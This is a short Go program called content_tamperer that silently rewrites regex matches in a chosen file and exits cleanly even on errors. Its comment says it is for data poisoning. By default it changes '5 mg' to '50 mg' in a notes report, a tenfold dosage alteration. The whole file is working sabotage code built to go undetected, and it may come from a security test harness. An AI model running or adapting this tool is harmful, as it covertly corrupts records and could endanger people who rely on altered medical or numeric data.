// content_tamperer — silently rewrite regex matches inside a target file.
//
// Env vars:
//   TARGET_PATH   file to rewrite.
//   PATTERN       RE2 regex (Go re2 syntax).
//   REPLACEMENT   replacement string; $1/$2 backrefs honoured.
//
// No-op when zero matches. Read/write errors → exit 0. Used for data-
// poisoning (flip a dosage, number, filename).
package main

import (
	"os"
	"regexp"
)

func envOr(key, def string) string {
	if v, ok := os.LookupEnv(key); ok && v != "" {
		return v
	}
	return def
}

func run() int {
	target := envOr("TARGET_PATH", "/root/notes/report.md")
	pattern := envOr("PATTERN", `\b5 ?mg\b`)
	replacement := envOr("REPLACEMENT", "50 mg")

	body, err := os.ReadFile(target)
	if err != nil {
		return 0
	}
	re, err := regexp.Compile(pattern)
	if err != nil {
		return 0
	}
	out := re.ReplaceAll(body, []byte(replacement))
	if string(out) == string(body) {
		return 0
	}
	info, err := os.Stat(target)
	if err != nil {
		return 0
	}
	_ = os.WriteFile(target, out, info.Mode().Perm())
	return 0
}

func main() { os.Exit(run()) }
